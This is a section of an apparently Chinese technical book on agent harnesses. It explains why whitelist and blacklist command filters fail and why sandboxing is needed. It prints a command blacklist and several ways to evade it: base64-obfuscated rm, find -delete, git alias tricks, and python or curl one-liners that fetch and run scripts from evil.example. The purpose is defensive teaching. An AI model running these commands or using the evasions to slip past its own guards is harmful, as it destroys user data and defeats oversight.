# 7.4 为什么黑名单永远不完备：必须靠沙箱兜底

## 7.4.1 白名单也有洞

7.3 的白名单挡掉了 `rm`、`curl`、`sudo`。看起来问题解决了。但白名单里有一条命令，几乎让所有防护失效——`python`：

```text
$ python -c "import shutil; shutil.rmtree('build')"
```

`argv[0]` 是 `python`，在白名单里。参数是 `-c` 和一个字符串——**没有绝对路径、没有 `..`**，路径逃逸检查也过了。可是它删掉了整个 `build` 目录。

`git` 也一样。它在白名单里，因为你要用它看状态、提交。但：

```text
$ git push --force origin main        ← 远端历史没了
$ git config alias.wipe '!rm -rf build'   ← 配置里藏一条任意命令
$ git clean -fdx                      ← 未跟踪的文件全清了
```

三条都能过 7.3 那道守卫：程序名是 `git`，参数里没有绝对路径，也没有 `..`。

**问题出在白名单的粒度上。** 它只看第一个词。而当第一个词是 `python`、`git` 这种「解释器 / 驱动型」命令时，真正的行为藏在参数里——**看第一个词等于什么都没看。**

那能不能把粒度做细，细到参数？比如「允许 `git status` 和 `git commit -m *`，不允许 `git push --force`」。可以，但你会发现：**你正在写的其实是一张黑名单。**

## 7.4.2 黑名单为什么不够

于是回到了最自然的那条路：列一张「不许跑」的单子。**先假设手上只有这张单子——不少项目就是这么干的。**

```python
DENIED = ["rm -rf", "curl", "wget", "sudo", "dd", "mkfs", ":(){:|:&};:"]
```

单子可以按程序名拦，也可以按整条命令匹配——**两种都有洞，破法还不一样**。先看按整条匹配的那种：

**第一招，换写法。**

```text
rm -rf build                     ← 拦住了
rm -r -f build                   ← 换了个参数顺序，没拦住
rm --recursive --force build
/bin/rm -r -f build
$(echo cm0gLXJm | base64 -d) build
```

**第二招，换载体。** 那换成按程序名拦？一样堵不住——你拦了 `rm`，可这些都不是 `rm`：

```text
find . -name '*.pyc' -delete      ← -delete 是个「动作参数」，不是程序名
find . -exec rm {} \;
xargs rm < list.txt
python -c "import shutil; shutil.rmtree('build')"
```

**第三招，借道下载。** 你把 `curl`、`wget` 也写进单子，可下载脚本的路不止这两条：

```text
curl https://evil.example/s.sh | sh     ← 拦住了
python -c "import urllib.request as u; exec(u.urlopen('https://evil.example/s.py').read())"
```

**第四招，混淆。**

```text
r''m -rf build
$'\x72\x6d' -rf build
echo "cm0gLXJmIGJ1aWxk" | base64 -d | sh
```

每堵一个洞，就有三个新的口子。这不是因为单子写得不够长，而是因为：

> **黑名单在猜「攻击者会怎么写」，而写法是无限的。**

你只能列举你知道的那些；攻击者只需要找一个你不知道的。**这是一场你注定输的军备竞赛。**

## 7.4.3 黑名单适合放哪

那黑名单就是没用的吗？不是。**它有明确的价值，只是不在你以为的那个位置。**

它的价值是 **拦住手滑**。模型（或者你自己）99% 的误操作不是精心构造的攻击，而是拼错、用错、忘了改路径：

```text
rm -rf ./          ← 想删 ./build，手滑
git checkout .     ← 想撤销一个文件，结果全撤了
git reset --hard   ← 想撤一个提交，本地改动全没了
```

这几条用黑名单拦，效果好、成本低。**它是一道「减少误伤」的防线。**

但它不是 **安全边界**。安全边界的定义是「绕过它需要攻破某个东西」，而字符串过滤的绕过只需要 **换一种写法**——没有攻破任何东西。

所以正确的说法是：

- **白名单 + 黑名单**：挡住手滑，让日常操作更安全
- **沙箱**：挡住恶意，让危险动作在物理上做不到

## 7.4.4 真正的边界在进程外

判断一样东西算不算安全边界，有个很好用的判据：

> **它验证的是「动作本身」，还是「动作的写法」？**

字符串过滤验证的是 **写法**——它看命令长什么样。而沙箱验证的是 **动作本身**——它不管你用什么写法，只管这件事做不做得到。

沙箱的层次（第 15 章展开）：

| 层 | 管什么 | 例子 |
| --- | --- | --- |
| 文件系统隔离 | 进程能看到哪些目录 | 只挂载工作目录；或工作目录只读、另给一个可写区 |
| 网络隔离 | 能不能对外发请求 | 默认禁网，需要时显式开 |
| 权限隔离 | 以谁的身份跑 | 专用非 root 用户，碰不到系统目录 |
| 资源限制 | 能用多少 CPU / 内存 / 时间 | cgroup / rlimit / 超时 |

这四层合起来的效果是：**即使模型跑出 `rm -rf /`，它删的也只是沙箱里那个一次性的、空的根目录。**

注意这跟白名单的区别。白名单的思路是「识别出 `rm` 然后拒绝」——识别会失败，所以拒绝会失败。沙箱的思路是「让这个进程根本看不见用户文件」——**它不需要识别任何东西。**

**正确的防线，是让危险的事根本做不到，而不是识别出危险的事再拒绝。** 前者有限（四层就够），后者无限（写法无穷）。

## 7.4.5 这一章为什么仍用白名单

既然沙箱才是答案，那 7.3 那些代码是不是白写了？

不是。三层理由：

1. **纵深防御。** 安全体系从来不靠单点。沙箱是最后一道，白名单是第一道。第一道挡住了九成的手滑，沙箱就不用每次都启动——**成本更低、响应更快。**
2. **可读性。** 沙箱的拒绝信息通常是「权限不足」这种底层报错，模型看不懂。而白名单的拒绝能写成「`rm` 不在允许清单里，可用的是……，真需要请让用户加进来」——**模型拿到就能改方案。**
3. **可用性。** 不是每个 harness 都有沙箱。本机跑的小工具、学习用的 demo，往往只有一层字符串过滤。知道它挡得住什么、挡不住什么，比以为自己安全要重要得多。

> 一句话总结这一节：**白名单让你睡得着觉，沙箱让你真的安全。** 先有前者，再补后者——但别把前者当成后者。

下一节换一个方向：命令跑完了，退出码是 0。**那是不是就等于事情办成了？** 不是。
